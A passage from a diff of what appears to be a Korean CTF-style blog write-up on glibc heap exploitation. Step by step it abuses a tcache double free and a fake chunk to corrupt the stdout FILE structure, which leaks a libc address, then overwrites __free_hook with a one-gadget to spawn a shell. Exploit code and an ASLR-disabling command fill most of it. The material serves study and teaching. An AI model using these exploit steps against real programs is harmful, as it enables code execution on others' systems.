+<span class="token function">free</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+<span class="token function">free</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+
+# <span class="token number">0xd1</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span> <span class="token operator">-></span> Fake chunk
+<span class="token function">alloc</span><span class="token punctuation">(</span><span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token function">p8</span><span class="token punctuation">(</span><span class="token number">0x70</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token function">alloc</span><span class="token punctuation">(</span><span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token string">"A"</span><span class="token punctuation">)</span>
+<span class="token function">alloc</span><span class="token punctuation">(</span><span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token string">"BBBB"</span><span class="token punctuation">)</span>
+
+<span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">escape</span> <span class="token expression">tcache</span></span>
+<span class="token keyword">for</span> i in <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token operator">:</span>
+    <span class="token function">free</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>
+
+<span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">unsorted</span> <span class="token expression">bin <span class="token operator">&lt;</span><span class="token operator">-</span> escape <span class="token function">tcache</span> <span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span></span></span>
+<span class="token function">free</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>
+<span class="token function">pause</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre></div>
+<p><span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; "
+    >
+      <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 66.11111111111111%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAIAAAAmMtkJAAAACXBIWXMAAAsTAAALEwEAmpwYAAABrUlEQVQoz4XS626iQByGca9jKw7KaYBBQQsUKqUKWlxOIjCACB7aZu//DjamaZu1WU2er7+8yX+moy1kwxo+RA/yXFf0sSjDiS5MdB7JsEdDcLXOnasTCP1y1e6TSQqPgGbBLfONCUfvIdR1NcI2ScH8wj3q3A3cfdZ6IrqbqcTUJIUpYAXA8oCBAwj7HCRoCCjuuwtMQo5lJU0wVNGmtLmg2cbT+P6eMkyaF5gBBUlOBFACEAEOkRfYd3V3NvUDN8O/X3CysBwLjRzDWFqWrZkTKNJDFagWOXnsK/qA4f/BUYzjtJotg03VZuXuJVzTSAnSIq3bKC8ZcUT0GTD46PKWnTAt4qx8Xnh41xbNfhUmUFLivKwPr3jbQCQTFAcY/hzN/8AbHG0K2/Vw3ZbNYRUlHFKirDjjXcshmRj89/E6YYqjtJgtVrhud8f3BFefy29lc4CScg0HSR5usO16+bap2qO/TjlJidJiuz/huoXS1eUoK+O8mi39sj3uTu9xiuFwnBTb9u3Pdn+6sbxarIJgbdjOMoiDJHM8nxFGc8/316kXrllx2PvxN77wX2mEmoOMdcSpAAAAAElFTkSuQmCC'); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="./7.png"
+        title="./7.png"
+        src="/static/4888cd178a7732d198d147e63ff153e5/37523/7.png"
+        srcset="/static/4888cd178a7732d198d147e63ff153e5/e9ff0/7.png 180w,
+/static/4888cd178a7732d198d147e63ff153e5/f21e7/7.png 360w,
+/static/4888cd178a7732d198d147e63ff153e5/37523/7.png 720w,
+/static/4888cd178a7732d198d147e63ff153e5/59822/7.png 916w"
+        sizes="(max-width: 720px) 100vw, 720px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+        decoding="async"
+      />
+    </span></p>
+<ul>
+<li><code class="language-text">0x555555757260</code> Fake Chunk 부분을 8번 해제하여 마지막 한 부분이 unsortedbin 값에 대입된다.</li>
+<li>unsorted bin으로 넘어가는 부분에서 FD, BK 위치에 main_arena 주소가 담겨 있는 것을 확인할 수 있다.</li>
+</ul>
+<h2 id="point-to-stdout" style="position:relative;"><a href="#point-to-stdout" aria-label="point to stdout permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>point to stdout</h2>
+<p><span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 572px; "
+    >
+      <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 46.666666666666664%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAIAAAC9o5sfAAAACXBIWXMAAAsTAAALEwEAmpwYAAABqUlEQVQoz03Qa2+iQBQG4P6KTRovRQvVbuyuxoLOKDDAAMNFLgPDcJFAY9Pb/v/vjWl33a/nnCfvm3NlQc1HFkHYPaQ6JgfKWNVSXlNey3A/nEhLBei2Zzgecjxkk/liOb6d3YjzG3F+ZXiHiFUBLdwwBZoZZzykhRNEThDvEB4Iomq5RdMnrIxZFdFipcDhRBKk+zO2gyTjdZgwP6Y6JvzY8bbLqqbuTiSMr8dT5Ph1/5xXx7xuq7ZXdtoFkyjjTUd5E2Wlcb47nd7+HJ+em/7kBtH1eGqSsH/9eHp571/eT28fClQH/7DphhEtwpTZ/rlnwkp+7M4l8xJhdyBIe8NmdcfqNq/bsu1ksL8kI9sPk5wECSYHoJlhmlPexDmnvEHY/TEUoI7ToklZFbMqKxsFqheMZWA/bl2o6djzokw1nUegAs2AyIKatVLgUgZb1ZSBulWNzV4X7x8u3zZlYK43IcKbnQ51vDdsDRPTDUwSBEmO/QjqlobJ7/VmtljNFssv9o23DyuwWGrrjfTz10AQR9O70fRuOJGGE2kgiH8n0uh29rX6H38CClWFRviwlkEAAAAASUVORK5CYII='); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="./8.png"
+        title="./8.png"
+        src="/static/eaee5a88b2a3cb62c01f43e504f2c91c/a805e/8.png"
+        srcset="/static/eaee5a88b2a3cb62c01f43e504f2c91c/e9ff0/8.png 180w,
+/static/eaee5a88b2a3cb62c01f43e504f2c91c/f21e7/8.png 360w,
+/static/eaee5a88b2a3cb62c01f43e504f2c91c/a805e/8.png 572w"
+        sizes="(max-width: 572px) 100vw, 572px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+        decoding="async"
+      />
+    </span></p>
+<ul>
+<li>stdout 주소와 main_arena 영역의 주소는 가까우며 1.5byte brute-force를 통해 main_arena의 주소를 stdout 주소로 조작해야 한다.</li>
+<li>ASLR을 끈 후에 익스프로잇을 작성하자</li>
+</ul>
+<div class="gatsby-highlight" data-language="cpp"><pre class="language-cpp"><code class="language-cpp">sysctl <span class="token operator">-</span>w kernel<span class="token punctuation">.</span>randomize_va_space<span class="token operator">=</span><span class="token number">0</span></code></pre></div>
+<ul>
+<li>미리 할당한 청크를 Double Free해 unsorted bin 청크 위에 새로 할당하고 하위 바이트를 덮어써 stdout 주소로 조작 한다.</li>
+</ul>
+<div class="gatsby-highlight" data-language="cpp"><pre class="language-cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">double</span> <span class="token expression">free</span></span>
+<span class="token function">free</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
+<span class="token function">free</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
+
+<span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">point</span> <span class="token expression">to main_arena address of unsorted bin</span></span>
+<span class="token function">alloc</span><span class="token punctuation">(</span><span class="token number">0x78</span><span class="token punctuation">,</span> <span class="token string">"\x70"</span><span class="token punctuation">)</span>
+<span class="token function">alloc</span><span class="token punctuation">(</span><span class="token number">0x78</span><span class="token punctuation">,</span> <span class="token string">"A"</span><span class="token punctuation">)</span>
+<span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">stdout</span> <span class="token expression">brute force</span></span>
+<span class="token function">alloc</span><span class="token punctuation">(</span><span class="token number">0x78</span><span class="token punctuation">,</span> <span class="token string">"\x60\x07\xdd"</span><span class="token punctuation">)</span>
+<span class="token function">pause</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre></div>
+<p><span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; "
+    >
+      <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 50%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAIAAAA7N+mxAAAACXBIWXMAAAsTAAALEwEAmpwYAAABVUlEQVQoz43Q226CQBCAYV7DpCzKssssuOBC8ICCBypYj4itpbZarU37/m/QYONFE9ua/Jm7L5kZSQQ1J3B57DPHAc7MGmMWKxNQtP+TSqFXcq3S0JdNX1ZBroCsXiULLHc95Nk3SRPxNiIG0kAhRUj7kXyaCtbPUQWDhI0qBcHNDlSbthCOYLalV6uAMWgaUA3wKaqBShhiVhm4onPEamVqSEnIOm17ktSDpGF6EbiJ7bTiYRJFsWC8QQ1xyiSgEqMwUHhkiAJnWTZLl4uH1eZwCOOJ3QiW+cs0W+tcKBpgwlTCMGHKxbVnq3w0y+JJmr/s+/HIbbY3r8fscUNNW1apcr758sPS9dN4nk3S+93x4/Zu6raC7dtHvt0DF9/4tyrUkNL7fLxYjebL3fvncDwTdf95/75+3rFr8KDTC7tRuz/0e5Hnh5bbCAZxKxxgMBHW/8Zf6f5tmHFRerAAAAAASUVORK5CYII='); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="./9.png"
+        title="./9.png"
+        src="/static/77760310dd7914b3f7438543febc9f5a/37523/9.png"
+        srcset="/static/77760310dd7914b3f7438543febc9f5a/e9ff0/9.png 180w,
+/static/77760310dd7914b3f7438543febc9f5a/f21e7/9.png 360w,
+/static/77760310dd7914b3f7438543febc9f5a/37523/9.png 720w,
+/static/77760310dd7914b3f7438543febc9f5a/302a4/9.png 1080w,
+/static/77760310dd7914b3f7438543febc9f5a/dc61a/9.png 1147w"
+        sizes="(max-width: 720px) 100vw, 720px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+        decoding="async"
+      />
+    </span></p>
+<ul>
+<li>Double Free Bug를 바탕으로 같은 주소를 가리키게 한 다음 해당 크기 만큼 동적할 당하여 FD 값을 <code class="language-text">\x70</code> 바이트로 변조하여 Fake Chunk를 가리키게 한다.</li>
+<li>다음 할당은 버리고 Fake Chunk에 값을 써 하위 3바이트 부분을 stdout 주소로 변조한다.</li>
+<li>그럼이제 stdout을 조작할 준비가 끝났다.</li>
+</ul>
+<h2 id="overwrite-stdout-struct" style="position:relative;"><a href="#overwrite-stdout-struct" aria-label="overwrite stdout struct permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Overwrite Stdout Struct</h2>
+<ul>
+<li>Double Free Bug를 통해 조작한 stdout 주소가 존재하는 위치에 힙 청크를 할당 한다.</li>
+<li>할당하게 되면 FD가 stdout 주소가 되기 때문에 다음 할당 시 stdout 구조체에 할당이 되어 해당 구조체에 값을 쓸 수 있다.</li>
+</ul>
+<div class="gatsby-highlight" data-language="cpp"><pre class="language-cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">double</span> <span class="token expression">free bug</span></span>
+<span class="token function">free</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+<span class="token function">free</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+<span class="token function">free</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+
+<span class="token function">alloc</span><span class="token punctuation">(</span><span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token string">"\x70"</span><span class="token punctuation">)</span>
+<span class="token function">alloc</span><span class="token punctuation">(</span><span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token string">"A"</span><span class="token punctuation">)</span>
+<span class="token function">alloc</span><span class="token punctuation">(</span><span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token string">"\x60"</span><span class="token punctuation">)</span> # <span class="token constant">stdout</span> <span class="token number">1</span> byte \x60
+<span class="token function">pause</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre></div>
+<p><span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; "
+    >
+      <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 36.66666666666667%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAIAAACHqfpvAAAACXBIWXMAAAsTAAALEwEAmpwYAAABDElEQVQY032Ny27CMBRE8xstwU78im/8CLEJdiCBJulTYkclyqb//xkVbUHqokhHs5ozk3SD7fuq22+WY3Druqykj6UL4AIQIRGVmP1LMnsJyKjZ4NMhkGqX8SIX8ocb2q+cPgakdTqu5kOL9RazArPz4e3Pi/wU51rdTcvZFJHepUSmBBADzGTG/1TRJdFVvjeWCMuqFdgttVNZN8ZbWxG9ENqLlBZzWiAmMybJeQ7ybzIGmEOydmC17uu49bFpbKh942Nlg5OmlyaAiVK1ogwCgElJhSLcEq4Iz8Emp6N5GM3+YA5HFd8b3L7R7pN2H265OeyG0/T8GjarQjWFMhyo8ahusWvxIhBRfgF/OEaudvk0pQAAAABJRU5ErkJggg=='); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="./10.png"
+        title="./10.png"
+        src="/static/f210e0c184e41d303510650668f2cd66/37523/10.png"
+        srcset="/static/f210e0c184e41d303510650668f2cd66/e9ff0/10.png 180w,
+/static/f210e0c184e41d303510650668f2cd66/f21e7/10.png 360w,
+/static/f210e0c184e41d303510650668f2cd66/37523/10.png 720w,
+/static/f210e0c184e41d303510650668f2cd66/35751/10.png 873w"
+        sizes="(max-width: 720px) 100vw, 720px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+        decoding="async"
+      />
+    </span></p>
+<ul>
+<li>이제 stdout 구조체를 영역을 할당하여 값을 조작하도록 한다.</li>
+</ul>
+<p><span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 513px; "
+    >
+      <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 101.66666666666666%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAIAAAAC64paAAAACXBIWXMAAAsTAAALEwEAmpwYAAADEElEQVQ4y22S2Y7bOBBF/RsznbZkWwupfV+ohRI3UWvb3TCmkf//kIHsIEg6AeqBL4f31EUdWBrxyKmAledx0RQ1rusOlThHjKZ1r8JIAaFq+irwFQ1oOtR1cNEAMKChw4MTZKghSV5DL8lqgjDPKqJq9sV0zqalaOZJB4oGVM1UNKDoUDUs1bCOOjxq4HDUAR0WPm1ifqt73hAxv997Idf3/1o6pGXb8SkpGj5umE11z6uWpGXjBunr2TicDLtnE2aSyrUhIipqsVzFsl3vn8v1nlVtL2bUko6NYr7WHad8LOo+Re3xYu4wHRa53ui4snGNi5rIhc3ruN1u9+9ZhTGVLR2aXizXe9MLNsx7Nw05GfCgGlbPRyL2cIRpghqx3Ni0vn18ztd7lCEi5qIhLR34tCFMqZiKuk/2ZOOgGjaXG5Mrn94qTGvCh/XWcbl9fNY9L1uyf9qScX3HbOz5VNSdE6YadBUN7HDHxl2MDJjJp3aQFmfT/jGGdTbtC3BOj8fJsBQNHi97+fvOTK7j9jHMVzFfi7bPm04DzouqfTvpP+f1bBw1cLyYT+w5+874kRykRT/MCNMwq8IM2UESpCX04yApvTjfPX/BfsI2lYuYtgS1cr1ZXmQ6oeXHGnRNJ9CgC70IeNEFOF/IH8lVx8iwVJilqE0R9pLcT8swR2GO/KRQLubr2fgz9rmz1bGJjqtc35uek3HBbADunqlb7jPw+OCPf9HW952pXKqOZzXOKhxmCLjhSbc06BpOYNi+bnnADc+m/Re4F1NLB4SpWK7j9j6uNyoXzMeWiDBDTphYfhxmSIPu7v9FG/ORT29RXjVEZDWGfuQleZgj4IWG5UEvgm5ouqFhe6oOvxbWi4mNa0tl0RLMR7newqyMixr6kRtlUVYFaRmkyPbjx4X8rt1SKaYNU4mZtPw4yqt/jud/lcu3k/6iai/K5eWXO/kNPmqAyq1jY0OHYb32wxSkhQ69vSfbMx+FnQxL1eEX5x02nCDKqqRsgBsaTpBWreXHRUPCDFl+HGQoLZvTH9gT/h/N8/GBcOa2rgAAAABJRU5ErkJggg=='); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="./11.png"
+        title="./11.png"
+        src="/static/dfec5074f1609d93b8deaeec6076a1f4/267f6/11.png"
+        srcset="/static/dfec5074f1609d93b8deaeec6076a1f4/e9ff0/11.png 180w,
+/static/dfec5074f1609d93b8deaeec6076a1f4/f21e7/11.png 360w,
+/static/dfec5074f1609d93b8deaeec6076a1f4/267f6/11.png 513w"
+        sizes="(max-width: 513px) 100vw, 513px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+        decoding="async"
+      />
+    </span></p>
+<ul>
+<li>_IO_FILE 구조체의 stdout을 확인해 보면 우리가 변조해야 할 부분은 <code class="language-text">_flags</code>, <code class="language-text">_IO_write_base</code> 이다.</li>
+<li>기존의 stdout flags 값은 <code class="language-text">0xfbad2887</code> , <code class="language-text">_IO_IS_APPENDING</code> 플래그가 존재하지 않기 때문에 <code class="language-text">0xfbad2887 | 0x1000</code> 값으로 조작하자</li>
+<li><code class="language-text">_IO_write_base</code> 값의 하위 바이트를 <code class="language-text">\x20</code> 으로 조작해 라이브러리 주소를 출력 한다.</li>
+</ul>
+<div class="gatsby-highlight" data-language="cpp"><pre class="language-cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">double</span> <span class="token expression">free bug</span></span>
+<span class="token function">free</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+<span class="token function">free</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+<span class="token function">free</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+
+<span class="token function">alloc</span><span class="token punctuation">(</span><span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token string">"\x70"</span><span class="token punctuation">)</span>
+<span class="token function">alloc</span><span class="token punctuation">(</span><span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token string">"A"</span><span class="token punctuation">)</span>
+<span class="token function">alloc</span><span class="token punctuation">(</span><span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token string">"\x60"</span><span class="token punctuation">)</span> # <span class="token constant">stdout</span> <span class="token number">1</span> byte \x60
+
+<span class="token function">alloc</span><span class="token punctuation">(</span><span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token function">p64</span><span class="token punctuation">(</span><span class="token number">0xfbad1887</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">p64</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span> <span class="token operator">+</span> <span class="token string">"\x20"</span><span class="token punctuation">)</span>
+
+libc <span class="token operator">=</span> <span class="token function">uu64</span><span class="token punctuation">(</span><span class="token function">r</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x3eb780</span>
+one_shot <span class="token operator">=</span> libc<span class="token operator">+</span><span class="token number">0x4f3c2</span>
+free_hook <span class="token operator">=</span> libc<span class="token operator">+</span><span class="token number">0x3ed8e8</span>
+<span class="token function">leak</span><span class="token punctuation">(</span><span class="token string">"libc"</span><span class="token punctuation">,</span>libc<span class="token punctuation">)</span>
+<span class="token function">leak</span><span class="token punctuation">(</span><span class="token string">"one_shot "</span><span class="token punctuation">,</span>one_shot<span class="token punctuation">)</span>
+<span class="token function">leak</span><span class="token punctuation">(</span><span class="token string">"free_hook"</span><span class="token punctuation">,</span>free_hook<span class="token punctuation">)</span></code></pre></div>
+<p><span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; "
+    >
+      <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 53.333333333333336%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAIAAADwazoUAAAACXBIWXMAAAsTAAALEwEAmpwYAAABhklEQVQoz5XR62rcMBAF4H2QsuuLRpqRxpIl2Wt77Y0vySZtaNrC0gZ62bbv/xIlaSlJGgKFw/yaDw6c1fF4u58uy7I3XMVcBYERqAVy97cSSNpmyqaShSqEMutcbQT+zur4+bQfzw0yIjtTamTIUQkCgQpI5kppm0mTAKWgU6C/8g6/v/kwX900/aHpZ9f0TjsWqgTUgKXAAkhIs5GcgsmkzqReP8TL67chNC7XBZgosBLKS47KstQRuQbSxJmyibQC7dPan779mKdDRVun46jtLKlBV5mmIFcXfgZtjc3Jp+hBe0nFY/z1+zBdimLKuc3DdpC8VTboHZOP7BdB1riUwvP445fTOMwTmAF5IZ6l3pHxZU3GlT52uijYCfIZBcnhKb49/dyP540powttO3QuulCHeeFt53c9sDXWx27iavDtGRA/wtPFm3Y/j1fXF9fvbNWuBd6tIjARmORqk6kNUHKfhyP9wYfpUPdTd7ZU7cBl9e/HC1ltq5ZcIBsSoFcp/Bf+BRU8cnZelPcRAAAAAElFTkSuQmCC'); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="./12.png"
+        title="./12.png"
+        src="/static/9f8f7a3a39a130ed2c8bfc5ed75731a1/37523/12.png"
+        srcset="/static/9f8f7a3a39a130ed2c8bfc5ed75731a1/e9ff0/12.png 180w,
+/static/9f8f7a3a39a130ed2c8bfc5ed75731a1/f21e7/12.png 360w,
+/static/9f8f7a3a39a130ed2c8bfc5ed75731a1/37523/12.png 720w,
+/static/9f8f7a3a39a130ed2c8bfc5ed75731a1/efc66/12.png 885w"
+        sizes="(max-width: 720px) 100vw, 720px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+        decoding="async"
+      />
+    </span></p>
+<ul>
+<li>라이브러리 주소를 획득할 수 있다.</li>
+</ul>
+<h2 id="shell" style="position:relative;"><a href="#shell" aria-label="shell permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>shell!</h2>
+<ul>
+<li>Double Free Bug를 통해 __free_hook에 할당을 한 후 oneshot 가젯 주소로 조작한다.</li>
+<li>free 함수를 호출하여 쉘을 획득 할 수 있다.</li>
+</ul>
+<div class="gatsby-highlight" data-language="cpp"><pre class="language-cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">double</span> <span class="token expression">free</span></span>
+<span class="token function">free</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+<span class="token function">free</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+
+<span class="token function">alloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token function">p64</span><span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token function">alloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">)</span>
+<span class="token function">alloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token function">p64</span><span class="token punctuation">(</span>one_shot<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token function">free</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+
+<span class="token function">irt</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre></div>
+<p><span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 702px; "
+    >
+      <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 52.222222222222214%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAIAAAA7N+mxAAAACXBIWXMAAAsTAAALEwEAmpwYAAABHElEQVQoz43P7U6DMBgF4F6IG2Ol9IOWlsKgdIXCgH1EnboY4/1fiVET/2yZJOfPSd4nJy+wXH2c306v73LjctuHVC8oj7EQEQmugphcxRzGbIVoEBHQcPV5vhzOF6ErbVpRWJSkISQI3cBrnASIhYiufipYI2pc78cjSWQQYUh4iOgywstby0uIgwj/VSAId7b10ymRefztfy/InIBJ6oNts7pRhckrJ7IyjNlcPHD51A51N8m8VJuayTyAeAHjWdjktfejNo3IyqzcMllQqYlQs/Bj5bxxmXGpLnVpicgiKiBOHkK0WMf3/wcdS1+6yR+fjeua4WDbgauCiCxRBU01JPyOBzs/ut2+cr3rRusH68etH5t+v7Htv/gLF0NkkHZ2PV8AAAAASUVORK5CYII='); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="./13.png"
+        title="./13.png"
+        src="/static/f9aedffc660490664fdf82d881bd8f5b/d6331/13.png"
+        srcset="/static/f9aedffc660490664fdf82d881bd8f5b/e9ff0/13.png 180w,
+/static/f9aedffc660490664fdf82d881bd8f5b/f21e7/13.png 360w,
+/static/f9aedffc660490664fdf82d881bd8f5b/d6331/13.png 702w"
+        sizes="(max-width: 702px) 100vw, 702px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+        decoding="async"
+      />
+    </span></p>
+<div class="table-of-contents">
+<ul>
+<li><a href="#%EB%B0%94%EC%9D%B4%EB%84%88%EB%A6%AC-%EA%B0%9C%EC%9A%94">바이너리 개요</a></li>
+<li><a href="#%EB%B3%B4%ED%98%B8-%EA%B8%B0%EB%B2%95">보호 기법</a></li>
+<li><a href="#main-%ED%95%A8%EC%88%98-%EB%B6%84%EC%84%9D">main 함수 분석</a></li>
+<li><a href="#alloc">alloc</a></li>
+<li><a href="#free">free</a></li>
+<li><a href="#memory-leak-idea">memory leak Idea</a></li>
+<li><a href="#_io_file_stdout">_IO_FILE_stdout</a></li>
+<li><a href="#stdout">stdout</a></li>
+<li><a href="#_io_new_file_xsputn-%ED%95%A8%EC%88%98">_IO_new_file_xsputn 함수</a></li>
+<li><a href="#new_do_write-%ED%95%A8%EC%88%98">new_do_write 함수</a></li>
+<li><a href="#how-to-exploit-using-stdout">How to exploit using stdout</a></li>
+<li><a href="#double-free-bug">Double Free Bug</a></li>
+<li><a href="#fake-chunk-%EA%B5%AC%EC%84%B1">Fake chunk 구성</a></li>
+<li><a href="#how-to-free">How to Free?</a></li>
+<li><a href="#free-fake-chunk">Free Fake chunk</a></li>
+<li><a href="#point-to-stdout">point to stdout</a></li>
+<li><a href="#overwrite-stdout-struct">Overwrite Stdout Struct</a></li>
+<li><a href="#shell">shell!</a></li>
+</ul>
